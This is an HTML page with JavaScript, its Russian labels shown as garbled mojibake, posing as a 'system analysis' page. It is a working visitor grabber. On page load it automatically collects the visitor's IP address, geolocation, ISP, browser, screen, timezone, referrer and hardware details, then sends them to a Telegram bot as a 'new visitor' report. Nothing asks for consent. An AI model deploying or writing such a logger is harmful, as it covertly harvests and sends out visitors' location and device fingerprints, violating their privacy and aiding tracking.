<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 600px; 
            margin: 50px auto; 
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .status {
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            text-align: center;
            font-weight: bold;
        }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .loading { background: #d1ecf1; color: #0c5460; }
        .data-item {
            margin: 10px 0;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
            border-left: 4px solid #007bff;
        }
        .copy-btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            margin-left: 10px;
        }
        .copy-btn:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîç –ê–Ω–∞–ª–∏–∑ —Å–∏—Å—Ç–µ–º—ã</h1>
        <div id="status" class="status loading">–°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –≤–∞—à–µ–π —Å–∏—Å—Ç–µ–º–µ...</div>
        <div id="dataPreview"></div>
        <button onclick="copyAllData()" style="width: 100%; padding: 10px; margin-top: 20px;">üìã –°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ –¥–∞–Ω–Ω—ã–µ</button>
    </div>

    <!-- –ü–û–î–ö–õ–Æ–ß–ê–ï–ú –ö–û–ù–§–ò–ì –° –¢–û–ö–ï–ù–û–ú -->
    <script src="config.js"></script>
    
    <script>
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–æ IP
        async function getGeoInfo(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    country: data.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    city: data.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    region: data.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    isp: data.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            } catch (error) {
                return {
                    country: '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è',
                    city: '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è', 
                    region: '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è',
                    isp: '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è'
                };
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö
        async function collectAndSendData() {
            const statusElement = document.getElementById('status');
            const dataPreview = document.getElementById('dataPreview');

            try {
                // –ü–æ–ª—É—á–∞–µ–º IP –∞–¥—Ä–µ—Å
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                const geo = await getGeoInfo(ipData.ip);

                // –°–æ–±–∏—Ä–∞–µ–º –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                const userInfo = {
                    ip: ipData.ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(', ') : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                    screen: `${screen.width} x ${screen.height}`,
                    colorDepth: `${screen.colorDepth} –±–∏—Ç`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || '–ü—Ä—è–º–æ–π –∑–∞—Ö–æ–¥',
                    url: window.location.href,
                    timestamp: new Date().toLocaleString('ru-RU'),
                    country: geo.country,
                    city: geo.city,
                    region: geo.region,
                    isp: geo.isp,
                    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                    cpuCores: navigator.hardwareConcurrency || '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ',
                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                    cookies: navigator.cookieEnabled ? '–í–∫–ª—é—á–µ–Ω—ã' : '–í—ã–∫–ª—é—á–µ–Ω—ã'
                };

                // –§–æ—Ä–º–∏—Ä—É–µ–º –∫—Ä–∞—Å–∏–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
                const telegramMessage = `
üÜï <b>–ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨</b>

üåê <b>IP:</b> <code>${userInfo.ip}</code>
üìç <b>–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:</b> ${userInfo.country}, ${userInfo.city}
üè¢ <b>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</b> ${userInfo.isp}
üíª <b>–ë—Ä–∞—É–∑–µ—Ä:</b> ${userInfo.userAgent}
‚öôÔ∏è <b>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</b> ${userInfo.platform}
üì± <b>–≠–∫—Ä–∞–Ω:</b> ${userInfo.screen} (${userInfo.colorDepth})
üåç <b>–í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞:</b> ${userInfo.timezone}
üî§ <b>–Ø–∑—ã–∫:</b> ${userInfo.language}
üîó <b>–ò—Å—Ç–æ—á–Ω–∏–∫:</b> ${userInfo.referrer}
üìä <b>–ü–∞–º—è—Ç—å:</b> ${userInfo.deviceMemory}
‚ö° <b>–Ø–¥—Ä–∞ CPU:</b> ${userInfo.cpuCores}
üïí <b>–í—Ä–µ–º—è:</b> ${userInfo.timestamp}
                `.trim();

                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
                dataPreview.innerHTML = `
                    <h3>–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:</h3>
                    <div class="data-item"><strong>IP –∞–¥—Ä–µ—Å:</strong> ${userInfo.ip} <button class="copy-btn" onclick="copyText('${userInfo.ip}')">–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å</button></div>
                    <div class="data-item"><strong>–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:</strong> ${userInfo.country}, ${userInfo.city}</div>
                    <div class="data-item"><strong>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</strong> ${userInfo.isp}</div>
                    <div class="data-item"><strong>–ë—Ä–∞—É–∑–µ—Ä:</strong> ${userInfo.userAgent}</div>
                    <div class="data-item"><strong>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:</strong> ${userInfo.platform}</div>
                    <div class="data-item"><strong>–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞:</strong> ${userInfo.screen}</div>
                    <div class="data-item"><strong>–í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞:</strong> ${userInfo.timezone}</div>
                    <div class="data-item"><strong>–í—Ä–µ–º—è –ø–æ—Å–µ—â–µ–Ω–∏—è:</strong> ${userInfo.timestamp}</div>
                `;

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                const sent = await sendToTelegram(telegramMessage);
                
                if (sent) {
                    statusElement.className = 'status success';
                    statusElement.innerHTML = '‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram!';
                } else {
                    statusElement.className = 'status error';
                    statusElement.innerHTML = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ç–æ–∫–µ–Ω –∏ Chat ID.';
                }

            } catch (error) {
                statusElement.className = 'status error';
                statusElement.innerHTML = '‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö: ' + error.message;
                console.error('–û—à–∏–±–∫–∞:', error);
            }
        }

        // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        function copyText(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ: ' + text);
            });
        }

        function copyAllData() {
            const allText = Array.from(document.querySelectorAll('.data-item'))
                .map(card => {
                    const strong = card.querySelector('strong');
                    return strong.textContent + ' ' + card.textContent.replace('–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å', '').replace(strong.textContent, '').trim();
                })
                .join('\n');
            
            navigator.clipboard.writeText(allText).then(() => {
                alert('–í—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞!');
            });
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', collectAndSendData);
    </script>
</body>
</html>
